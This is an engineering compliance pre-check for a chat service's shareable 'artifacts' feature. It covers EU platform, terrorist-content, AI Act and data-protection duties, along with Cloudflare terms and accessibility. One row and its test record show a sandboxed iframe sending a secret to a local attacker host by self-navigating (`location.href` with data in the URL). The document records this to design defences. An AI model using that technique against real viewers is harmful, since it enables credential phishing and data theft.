# Compliance pre-check: Artifacts (A-12, BES-305)

> Engineer-drafted, not lawyer-reviewed. Sources checked on 2026-11-07 and
> 2026-11-08 (the per-source dates are in the Sources table).
> This is the Phase 1 (Artifacts) section of the agentic-capabilities
> pre-check record. An independent review against primary sources was done on
> 2026-11-08; its findings and fixes go in the PR body.
> The shared gate and the WCAG 2.2 AA decision will live in
> `docs/legal/agentic-capabilities-precheck.md` (P0-14, BES-303, written in
> parallel and not merged yet). Until it merges, this file answers the
> track-specific questions of BES-305 and runs the gate in full below.

## Verdict

**GO WITH CHANGES**: Phase 1 can be built, and A-1 and A-2 are not blocked,
once the changes in "Ticket changes" are written into A-1 to A-10 (all
of them have a row); no question returns "no-go as designed".

Second line, for the launch gate: **public sharing (`artifacts.share`) must not
go beyond a grant-only beta until the owner decides item 1 under "Owner items"
(Cloudflare separation) and A-9 is merged.** Rollout of storage and the bridge
also waits for the consent-wording decision (owner item 2).

## In plain words

- The DSA question does not change the owner's position, but it gets weaker.
  On the safer reading, a public `/a/<token>` link is "dissemination to the
  public" whatever `noindex` says (a counter-reading exists: the author has to
  hand the link out). The argument that the DSA does not apply (nothing is
  sold) is about the service, not the feature, so artifacts leave it unchanged
  and it already has to cover shared chats. Because it is untested, the
  voluntary notice-and-action process must be real for artifacts, not only on
  paper.
- Two things the plan assumed turned out to be wrong. First, the sandbox
  (no network, no forms) does not stop a malicious artifact from sending data
  out or showing a fake login page: the frame can navigate itself to any
  address, with data in the URL. The drafting agent tested this on 2026-11-07
  in Playwright Chromium and WebKit, and the reviewer re-ran it with the same
  result.
  The fix is a tripwire plus honest wording, not a stronger CSP. Second,
  moving only the runtime Worker to another Cloudflare account barely lowers
  the suspension risk, because reports target `besidka.com/a/<token>` and the
  content sits in the main account's R2.
- A-2 should not use esm.sh at all. Its operator, location and logging are
  unknown and it has no privacy policy. Serve a pinned, allowlisted set of
  libraries from the runtime Worker instead. This also removes the only
  third-party host from the viewer's browser.
- Besidka is still treated as the AI Act "provider" (the repo's position in
  `compliance-review-2026-10.md` section 3.2). The Commission's Art. 50
  guidelines (para 68) put source code outside the marking duty, so HTML, JSX
  and Mermaid artifacts are arguably out of scope, while Markdown is plain text
  and a rendered page is read by people. Marking `/a/` pages and exports is
  cheap, so do it: model id only.
- Viewer storage and the AI bridge are new uses of data that the current
  consent text does not name (it says "chats, projects and files").
  Recommendation: widen the consent wording and bump
  `CURRENT_CONSENT_VERSION` when artifacts leave `internal`. This is the one
  change that re-prompts every user, so it is an owner decision.
- A report-and-takedown flow built for "reports about shares" is not enough.
  It must also cover shared-chat artifacts, a takedown without a prior report
  (a one-hour terrorist-content order), a "threat to life" category, report
  records that outlive the artifact, and a six-month preservation hold.
  A-1 as written deletes the report rows together with the artifact.
- The MCP `artifacts:share` design is acceptable as the owner decided it. It
  needs clearer wording, a visible "created by connected app" mark and a daily
  cap.
- Needs the owner: the Cloudflare separation choice, the consent bump, a phone
  alert on the contact mailbox, and what happens to viewer progress when a
  share ends.

## Track-specific questions

Verdict key: go / go with changes / no-go. Quotes are verbatim and trimmed.
"UNVERIFIED" marks carry through to the Unverified section.

| # | Question | Source | Finding | Verdict | Required design change | Ticket to change |
|---|---|---|---|---|---|---|
| 1 | Does `/a/<token>` change the DSA conclusion of `compliance-review` section 3.1? | DSA Art. 3(g)(iii), 3(i), 3(k), 6, 16-19; Recitals 13, 14; Recommendation 2003/361 Art. 1, 2(3); Polish act Dz.U. 2026 poz. 1296 art. 22zzn, 22zzo | **Classification.** Art. 3(k): "making information available, at the request of the recipient of the service who provided the information, to a potentially unlimited number of third parties". Recital 14 asks whether information is "easily accessible to recipients of the service in general without further action by the recipient of the service providing the information", and treats an admission-controlled audience as public only if admission needs no "human decision". An unguessable link is unlisted, but anyone who holds it can open it and pass it on, so the audience is potentially unlimited. The counter-reading is that the author has to hand the link out, like a private message. Treat it as public to stay on the safe side. Besidka stores user information at the user's request (Art. 3(g)(iii), hosting). Whether it is also an online platform (Art. 3(i)) turns on the "minor and purely ancillary feature" carve-out (Recital 13, example: a newspaper comment section); a standalone public page viewable without an account is a weak fit, so do not rely on it. **Remuneration argument** (section 3.1: not "normally provided for remuneration") concerns the service, not the feature; it is neither strengthened nor weakened by artifacts, and it already has to carry the existing public shared chats. **What is new** is executable content (phishing, tracking, key-spend attempts), so notices will be more likely and more serious. **Art. 19** removes only Section 3 (Arts. 19-28, except 24(3)) for micro and small online platforms; Arts. 11, 12, 14, 16, 17, 18 stay for any hosting service. Whether a free personal project is an "enterprise" under 2003/361 Art. 1 ("engaged in an economic activity") is not answered by the text (open). **Polish act** (in force 2026-11-06): UKE is the coordinator (art. 15b); art. 22zzn ust. 2 fines hosting providers for breaching DSA Art. 16 (ust. 1, 2, 4 to 6), Art. 17 (ust. 1, 3, 4) and Art. 18; if the provider had no turnover in three years the fine is capped at EUR 6,000 (art. 22zzo ust. 4). Fines attach to a `dostawca usług pośrednich`, defined in art. 2 pkt 1b as a `usługodawca` providing an intermediary service; that a private non-gainful person is not a `usługodawca` is the repo's reading of UŚUDE art. 2 pkt 6 (`compliance-review` section 3.1), not re-read here. Conclusion unchanged: untested argument that the DSA does not apply, followed voluntarily. | go with changes | Make the voluntary process real for artifacts. (a) Report form: add a name field and require name plus email except for the child-abuse category (the Terms already promise this; A-7's email is optional, required only for an anonymous copyright report, and there is no name field); add categories `csam`, `terrorism`, `threat-to-life`; show the Art. 16(2) elements; automatic URL. (b) Receipt to the reporter without undue delay, decision plus redress options to the reporter, statement of reasons to the owner with the Art. 17(3) elements (templates in A-9). (c) Takedown must work at artifact level, so the shared-chat route (A-4) and the owner view honour it too, not only `artifact_shares`. (d) Keep section 3.1 wording in the Terms; do not claim an exemption publicly. | A-7 (BES-269), A-1 (BES-243), A-4 (BES-259), A-9 (BES-281) |
| 2 | Art. 18: does the report flow need a path to the authorities? | DSA Art. 18(1), 18(2); Polish act art. 22zzn ust. 2 pkt 3; TCO Art. 14(5); Terms "What I do with a report" | Art. 18(1) applies on becoming aware of "any information giving rise to a suspicion that a criminal offence involving a threat to the life or safety of a person or persons" has taken place, is taking place or is likely to take place, and it does not depend on a report. Art. 18(2): if the Member State concerned cannot be identified with reasonable certainty, inform the authorities of the Member State of establishment, or Europol, or both. If the DSA applies, the Polish act fines a breach of Art. 18 (art. 22zzn ust. 2 pkt 3). The Terms already say Besidka "will inform the relevant authorities" for such a crime, but nothing in A-7 can trigger or record that. The Polish act names no receiving authority for Art. 18 (it fines DSA Art. 18 only; UNVERIFIED that no other act does). Likely recipients are the Polish police or prosecutor; UNVERIFIED, not sourced. For terrorist content with an imminent threat to life, TCO Art. 14(5) says to inform "authorities competent for the investigation and prosecution of criminal offences in the Member States concerned". Only if those cannot be identified does it send you to the Art. 12(2) contact point of the Member State of main establishment (in Poland the ABW point, art. 26b) and to Europol. | go with changes | A-7: report category `threat-to-life` (and `terrorism`) sets `priority`, sorts first in the admin queue and sends the mailbox email with a subject prefix. Runbook (new, written in A-9): who decides, what is sent, to whom (police or prosecutor, mark UNVERIFIED until counsel confirms; 112 for an imminent threat; the TCO Art. 14(5) route for terrorist content), and a private record of the decision. Do not add automated scanning to find such content: the Terms promise none. | A-7 (BES-269), A-9 (BES-281) |
| 3 | TCO: can Besidka receive a one-hour removal order, and is the contact route of `compliance-review` section 3.3 enough? | Regulation 2021/784 Arts. 1(2), 2(1), 3(3), 6, 7, 10, 11, 15(1); Dz.U. 2024 poz. 1684 art. 26a-26g | Besidka is in scope if it is a hosting service provider that disseminates to the public (Art. 1(2)); public `/a/` links are treated as public like shared chats (TCO recital 45 uses the same "without requiring further action by the content provider" test as DSA Recital 14, so the same counter-reading applies). The definition runs through Directive 2015/1535, so the same remuneration argument as in row 1 applies and the two stand or fall together. Art. 3(3): remove "within one hour of receipt of the removal order". Art. 15(1): a contact point whose information is public; the Terms mailbox can serve, in English or Polish (Art. 15(2): the contact point information must list its languages, including at least one official language of the Member State of main establishment). The Terms name the mailbox only as the DSA Art. 11 and 12 contact point, not for removal orders. **Polish implementation (in force since 2024-12-03):** the Szef ABW is the competent authority (art. 26a) and runs a 24/7 contact point (art. 26b); orders are administrative decisions (art. 26d); fine up to 4% of the previous year's turnover (art. 26f), and where data is missing the base is estimated (art. 26g). No zero-turnover cap seen, unlike the DSA act; TCO Art. 18(2)(f) lists "the nature and size of the hosting service provider, in particular whether it is a micro, small or medium-sized enterprise" as a penalty factor, and art. 26f ust. 2 points to Art. 18. How the 4% applies to a non-gainful person is UNVERIFIED. The mailbox is enough as the contact route, but not as the one-hour mechanism: A-7's takedown starts from a report, and the only emergency lever is the global `artifacts` rule. Art. 6 requires preserving removed terrorist content and related data for six months; A-1's `deleteArtifacts` hard-deletes. Art. 7(1) wants the terrorist-content policy in the terms; Art. 7(2) a public transparency report by 1 March if any action was taken. Art. 11 and Polish art. 26e (annual data to ABW by 1 March) follow an order. | go with changes | (a) A-7: an admin "take down by URL, token, artifact id or user" action that needs no report, works from a phone, takes effect on the next request (no SWR cache), and writes the audit row. (b) The global `artifacts` rule off is the documented fallback (UI-only, already decided). (c) Takedown disables; it never deletes. Add `legalHoldUntil` so an order keeps the R2 object and the report row for six months, and owner or account deletion skips held rows. (d) Terms: one sentence on the terrorist-content policy (Art. 7(1)) and one saying the mailbox also receives removal orders, with its languages (Art. 15). (e) Runbook: the mailbox alert on the phone, who acts within the hour, the ABW BIP contact page, the 1 March duties. | A-7 (BES-269), A-1 (BES-243), A-9 (BES-281) |
| 4 | AI Act Art. 50: is artifact content synthetic text needing marking, who is provider and deployer, and do exports need a marker? | AI Act Art. 3(3), 3(4), 50(2), 50(4), 50(5), 111(4) as amended by Regulation 2026/1744; Commission guidelines on Art. 50 (20 July 2026) paras 11, 68, 73, 74; `compliance-review` section 3.2; `server/utils/ai/image-provenance.ts` | Art. 50(2) covers outputs of systems "generating synthetic audio, image, video or text content". **Scope for code.** The guidelines (para 68) place outside Art. 50(2) "Source code understood as content written in a programming, scripting, markup, query or configuration language that is intended to be interpreted, compiled or executed by a computing system". HTML, JSX and Mermaid source are therefore arguably out of scope. Two limits: a rendered quiz page is perceptible text meant for people (para 67 asks whether content is "intended to be interpreted, verified or acted upon by natural persons"), and a Markdown artifact is ordinary text, so treat Markdown as in scope; SVG sits between code and image (UNVERIFIED). **Provider vs deployer.** A preliminary research note read Besidka as at most a deployer. This pre-check follows the repo instead: `compliance-review` section 3.2 treats Besidka as a provider, and guidelines para 11 (read 2026-11-08) gives the example of a company offering "a generative or interactive AI application (e.g. a chatbot, image generator, AI agent)" under its own name, free or paid. Para 74 lets a provider rely on an upstream marking solution "to the extent that the marking solution is compliant with Article 50(2)", without prejudice to its duty to demonstrate compliance. The user who publishes an artifact is plausibly a deployer under Art. 50(4) only when acting professionally (Art. 3(4) excludes personal non-professional use) and only for text published to inform the public on matters of public interest. **Marking.** Para 73 lists "metadata identifications" among accepted techniques; whether a bare `<meta name="ai-generated">` is "effective, interoperable, robust" is UNVERIFIED, so treat it as a best-effort layer like the image tag. The banner is the visible disclosure; Art. 50(5) requires it to be clear, at first exposure, and to "conform to the applicable accessibility requirements" (row 15). MCP-created content may be human-written; over-labelling is harmless. **Timing.** Art. 111(4) gives providers of systems placed on the market before 2.8.2026 until 2.12.2026 for Art. 50(2); whether a feature added after 2.8.2026 to such a system keeps that grace is UNVERIFIED, so plan to mark at launch. | go with changes | Keep banner plus `<meta name="ai-generated" content="true">` on `/a/` and add the same meta to the shared-chat artifact view. In `buildStandaloneArtifactHtml` add the meta and an HTML comment "AI-generated by Besidka" with the model id only (same data-minimisation as the image tag: no prompt, no account data). Exports: add a one-line comment to `.md` (an HTML comment, invisible when rendered) and `.svg` (an XML comment or `<metadata>`); `.jsx` and `.mmd` stay unmarked as source code per para 68; add one Terms sentence (the existing image paragraph is the template). Needs `modelId` on `artifact_versions` if the model id is to be shown; otherwise omit the id. | A-4 (BES-259), A-1 (BES-243), A-9 (BES-281) |
| 5 | esm.sh fallback: operator, hosting, logging; self-host or disclose? | esm.sh landing page, README, LICENSE, HOSTING.md; GDPR Arts. 6, 13, 44; `compliance-review` section 2.2 (LG Munchen I, 3 O 17493/20) | The viewer's browser would send IP, User-Agent and Referer to esm.sh and to Cloudflare, the same class of leak as external fonts. Operator: "maintained by @ije", MIT, repo owner `esm-dev`; no company, address or country stated (UNVERIFIED). Hosting: Cloudflare CDN; origin build servers UNVERIFIED. No privacy policy or terms (`/privacy-policy` and `/terms` return 404; `/privacy` serves an unrelated npm package). Art. 13 information cannot be given honestly for a recipient nobody can name. Unpinned `https://esm.sh/<pkg>` also runs whatever esm.sh serves that day, from a single maintainer with no stated terms. Self-hosting esm.sh is supported (MIT) but not needed here. **Decision: do not use esm.sh in the viewer's browser. Serve the fallback from the runtime Worker.** | go with changes | A-2: replace the esm.sh fallback with a pinned, allowlisted set of pre-built ES modules in `/v1/assets/*` (set chosen from the A-10 golden prompts; recharts and lucide-react are candidates). An unknown bare import fails with a clear in-frame error. Remove `https://esm.sh` from `script-src` and from the import-map generation and the acceptance bullet that says a bare import resolves through esm.sh. A-3 instructions list the allowed imports. Exports: `buildStandaloneArtifactHtml` must not point at esm.sh either (inline the vendored builds, or export Mermaid as rendered SVG). Privacy Policy: no "Libraries loaded by artifacts" disclosure is needed. The runtime host is itself a second origin that the viewer's browser contacts (Cloudflare, the processor already named), so name it and say that libraries are served from it. | A-2 (BES-247), A-3 (BES-253), A-4 (BES-259), A-9 (BES-281) |
| 6 | Licences of vendored libraries and where the notice file is served | LICENSE files of facebook/react, alangpierce/sucrase, mermaid-js/mermaid, markedjs/marked | React and ReactDOM: MIT, "Copyright (c) Meta Platforms, Inc. and affiliates". Sucrase: MIT, "various contributors". Mermaid: MIT, but its bundle carries dependencies under other licences (dompurify "(MPL-2.0 OR Apache-2.0)", elkjs, d3, cytoscape, katex, dayjs, roughjs, khroma, stylis; per-dependency text UNVERIFIED). marked: MIT for Marked plus a BSD-style notice for John Gruber's Markdown; both notices must ship. MIT needs the copyright and permission notice in "all copies or substantial portions"; minified banners often vanish in a build. Any font or icon set added later (expected OFL) needs its own notice; the runtime has none today. | go with changes | A-2: a licence scan of the vendored set in CI (fail on a licence outside an allowlist), a generated `THIRD_PARTY_NOTICES.txt` served at `/v1/THIRD_PARTY_NOTICES.txt` from the runtime Worker and linked from the `/a/` footer and the Privacy Policy "Open source" paragraph, containing the MIT texts, the Gruber notice and the Mermaid transitive licences. Where a dependency is dual licensed, record which option is taken. | A-2 (BES-247), A-9 (BES-281) |
| 7 | LLM bridge on the viewer's key: consent gates, unfair-term risk, modal content | `docs/legal-memory-sensitive-data.md` (per-provider Art. 49(1)(a) consent); `docs/legal/dpia.md` sections 3.8, 3.8a, risk 8; GDPR Arts. 7, 9, 49; provider terms in `provider-training.md` | A-6 already runs `readLegalConsent`, `assertLegalConsent` and the model and provider transfer-consent checks as `title.patch.ts` does, so the gates apply per signed-in viewer on the server and a refusal blocks the call. Besidka remains the party that sends the data (DPIA section 2: "Besidka's server sends the request"; section 6 item 12: the Art. 30 record treats Besidka as the exporter for provider sends the user directs). **Gap 1, consent text:** the consent box covers "sensitive information I choose to include in my chats, projects and files" and sending it for "my chats, project memory and memory" (`app/components/Legal/ConsentModal.client.vue`); it does not name prompts built by an artifact or answers typed into one (see owner item 2). **Gap 2, what the viewer sees:** A-6 previews only 1,000 of up to 8,000 characters, so the viewer consents to text they cannot see; the modal shows a model select but does not name the provider. **Gap 3, the author wrote the prompt:** the viewer's provider account is exposed to prompts a stranger wrote (Anthropic keeps content flagged as a Usage Policy violation for up to 2 years); the key holder, not the author, carries that. Free Gemini keys outside the EEA may be used for training and human review. **Unfair-term risk** (engineering judgement; no consumer-law source was read, UNVERIFIED): low if spend is shown, per call or per session, and capped; weaker with "Don't ask again". DPIA risk 8's repeated-transfer caveat now also covers viewers. | go with changes | A-6 modal must show: the artifact title; "the author of this artifact wrote these prompts, not you and not Besidka"; the provider and model; the full prompt (scrollable, up to 8,000 characters); estimated maximum cost and the remaining calls per hour; for DeepSeek, Moonshot AI and Qwen the country and no-adequacy notice (the existing transfer consent modal supplies it); "your provider's terms for your account apply". Remove "Don't ask again" for artifacts opened through a share link (keep it for the owner's own artifacts). Terms: add artifacts to the paragraph on costs of your key. Nothing is stored. | A-6 (BES-265), A-9 (BES-281) |
| 8 | Viewer storage: Art. 9 in practice, purpose limitation, deletion | GDPR Arts. 5(1)(b), 5(1)(e), 9; `docs/legal/dpia.md` section 3.8; A-5 decisions | Values are opaque JSON written by artifact code (100 KB, 64 keys per artifact and viewer). Quiz answers can reveal health, beliefs or similar (a symptom tracker is health data), so treat them as potentially Art. 9 data. They rest on the Art. 9(2)(a) consent only if the consent covers them, which today it does not name (row 7). A-5's storage routes check the session and the flag but not the consent gate; the rest of the app refuses new content without current consent. Purpose limitation holds by design: values are served back to the same viewer, never rendered by the parent, never sent to a model, logs carry ids and byte counts. "Owners never see viewer storage" is true of Besidka's UI, API, MCP and exports, but it is not end-to-end: the author's code runs in the viewer's browser, receives the stored values, and can send them out by self-navigation (row 10). Public text must say so. A-5 keeps viewer rows after a share is revoked (re-sharing keeps progress); unreachable rows then live until the artifact or account is deleted, which is thin against storage limitation. | go with changes | A-5: storage routes require `getLegalConsentStatus === 'current'` like uploads do. Privacy Policy and the first-use caption must not claim the author "cannot" see answers. Retention: owner choice (owner item 4); recommendation: purge non-owner viewer rows 30 days after the last active share ends or is taken down, using the existing hourly sweep, and always on takedown or artifact deletion. Logs keep ids and sizes only (already planned). | A-5 (BES-260), A-9 (BES-281) |
| 9 | Minors: does the age gate cover viewers who use storage or the bridge; anonymous viewers | `compliance-review` section 2.1; COPPA (FTC guidance as cited there); GDPR Art. 8 (age of consent not re-checked here; moot while the service is 18+) | Besidka is a general-audience 18+ service. A viewer who signs in has ticked the 18+ box at sign-up and meets the in-app gate at the first message, but a viewer can reach A-5 storage without sending any message, and the sign-up confirmation is not stored on its own (section 2.1). A-6 does call `assertLegalConsent` (which includes the age record). Anonymous viewers get memory-only state; Besidka processes server request logs and, for reporters, the Turnstile check. Quiz templates attract minors, and a user-published artifact aimed at children is user content on a general-audience service. Whether that makes Besidka "directed to children" is UNVERIFIED (the COPPA test was not re-read). | go with changes | A-5 consent check (row 8) closes the storage gap. Terms "What you may not do": artifacts must not collect personal data from visitors (names, emails, ages) and must not be aimed at children under 13 (A-9). Confirm that `/a/` request logs use the route pattern, not the raw path with the token, and that no cookie is set for anonymous viewers (A-7 test). | A-5 (BES-260), A-7 (BES-269), A-9 (BES-281) |
| 10 | Phishing and credential harvesting: does the CSP make collection impossible; do the Terms forbid it? | A-2 CSP; DSA Art. 16; Terms "What you may not do"; the drafting agent's test (below) | **No, the CSP does not make it impossible.** The drafting agent tested a frame like A-2's on 2026-11-07 (`sandbox="allow-scripts"` plus a header CSP with `default-src 'none'`, `connect-src 'none'`, `form-action 'none'`, restricted `img-src`) in headless Playwright Chromium (build 1248) and WebKit (build 2370); the reviewer re-ran it on 2026-11-08 with the same result. `fetch` failed and the `Image` request never reached the test server, but `location.href = 'http://127.0.0.1:8802/nav?d=<data>'` from inside the frame delivered the data to the attacker host in both engines, a second `load` event fired on the iframe, and the page that replaced the runtime ran script and made its own `fetch` that reached the attacker host (no CSP applies to it). The CSP `navigate-to` directive that once covered this no longer exists (UNVERIFIED for current spec status; the test is the evidence). The test record is below. The in-app Browser pane could not be used (it blocked the child frame with `ERR_BLOCKED_BY_CLIENT`). Consequences: (1) a fake login or payment form inside an artifact can send what the viewer types to an attacker with one navigation; (2) the invariant "the iframe never fetches" holds only until the first self-navigation; (3) data in the frame (viewer storage, bridge output) can leave the same way. The banner and Report button are outside the frame, so the artifact cannot hide them. The Terms already forbid "phishing pages" and impersonating "a real person or organisation" but say nothing of artifacts, credential or payment forms, or redirecting visitors. | go with changes | A-2/A-4: the parent treats any iframe `load` after the first as a compromise: remove the frame, show an error, log `attributes.artifacts.runtimeNavigation` (ids only), and add the test to the e2e sandbox spec (self-navigation reaches no second page). State plainly in the DPIA that the URL payload leaves before teardown; this is a residual risk, not a fix. A-3 instructions: no navigation, no forms that ask for credentials, payment or personal data. Banner text keeps "not reviewed by Besidka"; add a one-line "Never enter passwords or payment details here" under the banner. Do not write "credential collection is impossible" or "the frame cannot send data out" in any ticket or document: A-2's acceptance bullet covers top navigation (`window.top.location`), which is blocked, so add the self-navigation case next to it; A-7's risks and A-9's DPIA must say the same. Terms and report categories as in row 1 (add `phishing`). A-10 eval 12 should include a navigation attempt. | A-2 (BES-247), A-3 (BES-253), A-4 (BES-259), A-7 (BES-269), A-9 (BES-281), A-10 (BES-287) |
| 11 | Cloudflare terms: can abuse reports against the runtime host suspend the account that also runs besidka.com; is separation a launch requirement? | Cloudflare Self-Serve Subscription Agreement (SSA) 2.5.1, 2.7, 8, 11; Developer Platform terms; Cloudflare abuse approach | SSA 2.7 forbids using the Services, and allowing third parties to, "facilitate phishing". SSA 8: Cloudflare "may immediately Suspend or terminate all or part of your use of the Services". Developer Platform terms: hosted content judged harmful may be blocked or removed and may lead to suspension of services; workers.dev subdomains may be renamed "for any or no reason". The abuse policy names Workers as a service where Cloudflare may be the origin hosting provider and allows suspending hosting services when they have been repeatedly used to store violating content and "no meaningful steps have been taken". The same policy says that "terminating all our services is not normally an appropriate or effective response to abuse", so a one-off report is unlikely to end the account; but the SSA still allows account-level action, and Workers, R2 and D1 are exactly the hosting services it would hit. The risk is account-level (assuming the Self-Serve agreement, not an Enterprise contract). **The coordinator's preliminary fix is too small.** A-2's runtime is static code with no bindings; the harmful content lives in R2 `artifacts/<userId>/...` and is served by `besidka.com` APIs (A-7), and reports will name `besidka.com/a/<token>`, all in the main account. Moving only the runtime Worker to a second account separates almost nothing. Real separation means the public page, the content read path, the R2 store and the runtime on a separate registrable domain in a second account. How browser or search-engine blocklists scope a flag (host or path) is UNVERIFIED. | go with changes | A-2: keep `NUXT_PUBLIC_ARTIFACTS_ORIGIN` the only place the runtime origin appears (already so); do not put the production runtime on `*.workers.dev` long term (rename risk). A-10: `artifacts.share` stays grant-only in beta (already so) and does not move to a percentage rollout until the owner decides item 1. Recommendation: full separation is a launch requirement for public sharing beyond the invited beta. A-9 or a new runbook: a Cloudflare abuse-response procedure (who answers, how to disable `/a/` in one action, what to say). A-1 and A-7 must not hard-code the host. | A-2 (BES-247), A-10 (BES-287), A-9 (BES-281) |
| 12 | Copyright: DSM Art. 17 and the notice process for artifacts | Directive 2019/790 Art. 2(6), 17, recital 62; Terms "Copyright complaints" | Art. 2(6): an online content-sharing service provider is one whose main or one of the main purposes is to store and give the public access to "a large amount" of protected works uploaded by its users, "which it organises and promotes for profit-making purposes". Besidka's main purpose is a chat app, and it has no profit purpose, so Art. 17 does not apply (the monetisation guard keeps it that way: ads or donations would change this reading). The carve-out for "cloud services that allow users to upload content for their own use" in Art. 2(6) fits public links poorly, so do not rely on it. The Terms notice process works for artifacts if the form carries its six elements; A-7's `copyright` reason has a free-text field only. | go with changes | A-7: when the reason is `copyright`, show the notice elements (work, exact URL, name, email, good-faith statement, accuracy and authority statement) as fields or a checklist, and require name and email. | A-7 (BES-269) |
| 13 | MCP `artifacts:share`: consent label and the decided limits | `docs/mcp-server.md` ("Left out on purpose" item 2, scopes); DPIA section 3.11, risks 28 to 37; A-8 | A-8 amends exclusion 2 of `docs/mcp-server.md` for artifacts only; the exclusion's own revisit condition (a draft share the user activates in the app) is not met, so this is a deliberate owner-decided exception. Limits as decided: separate unticked scope, noindex, expiry of at most 30 days, storage and bridge off, revocable, reportable, `detectSharePii` warnings returned. The label "Publish artifacts as public links (up to 30 days)" is clear. Residual: an injected agent that holds `chats:read` and `artifacts:share` can publish what it read; the 30-day cap and the owner's list limit the damage but cannot recall copies. | go | Confirm as decided. Small additions: the tool description says the link is public to anyone who has it; the owner's share list shows "created by connected app <name>" (needs the client id on `artifact_shares`, not only `createdVia: 'mcp'`); a daily cap on MCP share creation (suggest 10 per day, owner may change); the amendment in `docs/mcp-server.md` states the reason and the guard rails; DPIA section 3.11 gets a risk row. | A-8 (BES-275), A-1 (BES-243), A-9 (BES-281) |
| 14 | Breach runbook: new containment step, token hashing, new store | `docs/legal/breach-runbook.md` sections 2.2, 2.5, 2.6, 3; `docs/d1-restore-reconciliation.md`; A-1, A-7 | New stores: R2 `artifacts/<userId>/<id>/v<n>`, D1 `artifacts`, `artifact_versions`, `artifact_shares`, `artifact_storage`, `artifact_reports`, and the mailbox (reporter emails). Share tokens are stored as `tokenHash` (sha256), but A-7 also keeps `tokenEncrypted` so owners can copy links; a leak of `NUXT_ENCRYPTION_KEY` plus a D1 read exposes every active link, so section 2.5 (key rotation) needs a re-encryption step for `artifact_shares.token_encrypted` as for `keys`. Containment for a leaked link or a bad artifact: bulk revoke. A D1 restore revives revoked and taken-down shares (A-7 notes it). The `/a/<token>` path also reaches Cloudflare Web Analytics if the beacon loads on `/a/` after consent; whether it does is UNVERIFIED. | go with changes | Breach runbook (A-9): add "revoke all artifact shares" (`UPDATE artifact_shares SET revoked_at = <now> WHERE revoked_at IS NULL`, soft revoke keeps the evidence; count before and after) next to section 2.6; add `artifact_shares.token_encrypted` to section 2.5; add the store inventory; add risk-table rows for a public artifact link exposing personal data, R2 `artifacts/` exposure and a mis-set runtime origin or CSP (containment: global `artifacts` rule off). `docs/d1-restore-reconciliation.md`: replay revoked and taken-down shares and reports from Axiom (A-1, A-7 already plan the table list). A-7: suppress the Web Analytics beacon on `/a/**`, log the route pattern only. | A-9 (BES-281), A-7 (BES-269), A-1 (BES-243) |
| 15 | Accessibility of the `/a/` chrome (WCAG 2.2 AA target of P0-14) | P0-14 (BES-303) decision: WCAG 2.2 AA is the engineering target for every new surface; BES-305 puts AI-generated content itself out of scope; AI Act Art. 50(5) | P0-14's document is not merged in this worktree (its ticket describes the decision; UNVERIFIED that the merged wording matches). Art. 50(5) also says the AI disclosure "shall conform to the applicable accessibility requirements", so the banner is covered twice. The `/a/` chrome has a banner, a Report button, a report modal (reason radios, textarea with counter, email, good-faith checkbox, Turnstile), a takedown message page, a sign-in caption and an iframe. Risks: modal focus trap and return focus, labelled fields and error text, target size, contrast with DaisyUI tokens in light and dark, an iframe that needs a title, and keyboard users stuck inside generated content. | go with changes | A-7 and A-4 acceptance: banner is a landmark with readable contrast; Report is reachable by keyboard and has a visible focus; the modal traps and restores focus and labels every field and error; target size at least 24 by 24 CSS px; the iframe has a title (A-4 already sets one); a "skip to report" link before the frame; 320 px reflow and 200% zoom; an automated axe check on `/a/` and the report modal in the e2e spec. Content inside the frame is out of scope. | A-7 (BES-269), A-4 (BES-259) |

### Test record for row 10

Local, run by the drafting agent on 2026-11-07 UTC (00:14 to 00:18 CET on 2026-11-08) and re-run by the reviewer on 2026-11-08. A parent page embedded `<iframe sandbox="allow-scripts">`
loading a child served with this header: `Content-Security-Policy: sandbox
allow-scripts; default-src 'none'; script-src 'self' 'unsafe-inline';
style-src 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'none';
form-action 'none'; frame-src 'none'; base-uri 'none'`. The child tried an
`Image` request, a `fetch` and, after 600 ms, `location.href` to a second
local port that logged every request. Result in both engines: no `/img` and no
`/fetch` request; one `/nav?d=...` request with the secret in the URL; parent
iframe `load` count 2; the attacker page's own `fetch` (`/beacon`) arrived. The in-frame `fetch` failed in both engines.
`frame-ancestors` was left out (the harness was same-origin). It is a harness,
not A-2's Worker: A-2 should repeat it against the real runtime in its
Playwright sandbox spec (Chromium and WebKit).

## Shared gate

| Gate item | Finding | Action |
|---|---|---|
| 1. GDPR (Art. 30, DPIA, Art. 6 basis, Art. 9, Art. 49 transfers) | New categories: artifact content (R2 and D1), share records, viewer storage, bridge prompts relayed to the viewer's provider, report records with reporter name and email. Bases: contract for owner content, viewer storage and bridge (A-5, A-6 text); consent per share for publishing (as Art. 30 row 13 for chat shares); legitimate interests or legal obligation for reports (row 14a). Art. 9: owner content and viewer storage can hold it; the current consent text does not name artifacts (rows 7 and 8). Transfers: bridge uses the existing per-provider Art. 49(1)(a) consents; no new recipient if esm.sh is dropped (row 5); Cloudflare stays the processor. | Art. 30 rows 23 to 26, 14a extension, 13 extension; DPIA section 3.12 and risk rows; consent wording (owner item 2). Details in the A-9 input list. |
| 2. Public documents (Privacy, Terms, Cookie Policy) | Privacy Policy and Terms change (see input list). Cookie Policy: no new cookie, but the Report modal loads Cloudflare Turnstile on `/a/` for signed-out reporters, and `content/legal/cookie-policy.md` says Turnstile runs "only on those three pages. Nowhere else on Besidka loads it" (sign-in, sign-up, reset-password; the same limit is in its summary and in the list "Cookies set by other companies"). That statement becomes false. The Privacy Policy Turnstile paragraph and the Cloudflare recipient row name the same forms. A-4 uses `sessionStorage` for auto-open bookkeeping, and the Cookie Policy lists every key. "Two third-party scripts, both from Cloudflare" stays true. | A-9 edits the Cookie Policy (Turnstile pages, the summary sentence, any new `sessionStorage` key), the Privacy Policy Turnstile paragraph and the Cloudflare row, and states that there is no new cookie. |
| 3. Notification mechanics (WP260 materiality, `LEGAL_NOTICES`, `CURRENT_CONSENT_VERSION`) | Material under the `docs/legal.md` checklist: new purposes (public artifact links, viewer storage, AI features on the viewer's key), and in the Terms new obligations and grounds for takedown and suspension. `LEGAL_NOTICES` entry needed (30 days, or 14 with a stated reason). `CURRENT_CONSENT_VERSION`: bump recommended (owner item 2), because the consent wording changes. A bump also re-prompts everyone for the Terms, since a user is `current` only when both versions match (DPIA section 3.8). | Notice published before rollout beyond `internal`; `publishedAt` at or after the deploy; `legal:hash` committed. |
